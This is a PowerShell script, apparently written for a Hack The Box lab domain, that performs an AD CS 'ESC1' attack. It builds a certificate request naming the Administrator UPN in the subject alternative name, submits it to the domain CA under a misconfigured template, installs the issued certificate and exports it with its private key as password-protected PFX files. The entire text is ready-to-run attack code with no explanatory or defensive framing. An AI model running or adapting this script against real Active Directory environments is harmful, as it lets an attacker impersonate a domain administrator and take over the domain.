$ErrorActionPreference = 'Continue'
$dir = 'C:\Windows\Temp\esc1'
New-Item -ItemType Directory -Path $dir -Force | Out-Null
$inf = "$dir\req.inf"
$req = "$dir\req.req"
$cer = "$dir\admin.cer"
$rsp = "$dir\admin.rsp"
$pfx = "$dir\admin.pfx"
$log = "$dir\log.txt"
function L($x){ Add-Content $log $x; Write-Output $x }
'' | Set-Content $log

$infBody = @"
[Version]
Signature=`"`$Windows NT`$`"

[NewRequest]
Subject = "CN=Administrator"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 1
RequestType = PKCS10
KeyUsage = 0xa0

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=administrator@danglingtree.htb&"
"@
Set-Content -Path $inf -Value $infBody -Encoding ASCII
L "INF written"

L (certreq -new $inf $req 2>&1 | Out-String)
if (-not (Test-Path $req)) { L "NO REQ"; return }

# submit to CA
L (certreq -submit -config "dc.danglingtree.htb\danglingtree-DC-CA" -attrib "CertificateTemplate:EmployeeAuthTemplate" $req $cer $rsp 2>&1 | Out-String)
L ("cer exists=" + (Test-Path $cer))
if (Test-Path $cer) {
  L (certreq -accept $cer 2>&1 | Out-String)
  # export pfx
  $pwd = ConvertTo-SecureString -String 'Pfx123!' -Force -AsPlainText
  try {
    $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Subject -match 'Administrator' -or $_.HasPrivateKey } | Select-Object -First 5
    L ("certs in store: " + (($cert | ForEach-Object { $_.Thumbprint + ' ' + $_.Subject }) -join ' | '))
    foreach ($c in $cert) {
      Export-PfxCertificate -Cert $c -FilePath "$dir\$($c.Thumbprint).pfx" -Password $pwd -Force | Out-Null
      L ("exported $($c.Thumbprint).pfx")
    }
  } catch { L ("export ERR " + $_) }
}

# also try certutil
L "--- certutil ---"
L (certutil -ping 2>&1 | Out-String)
Get-ChildItem $dir | ForEach-Object { L ("FILE " + $_.Name + " " + $_.Length) }
L "DONE"
Get-Content $log -Raw
